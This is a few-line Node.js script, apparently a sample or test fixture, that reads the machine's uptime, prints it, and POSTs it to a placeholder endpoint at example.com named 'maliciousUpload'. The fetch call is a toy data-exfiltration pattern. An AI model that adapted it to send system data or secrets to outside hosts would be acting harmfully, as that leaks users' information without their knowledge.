const os = require('os')

const uptime = os.uptime()
console.log('Uptime:', uptime)

// upload
fetch(
  'http://example.com/maliciousUpload',
  {
    method: 'post', 
    body: { uptime }
  }
)
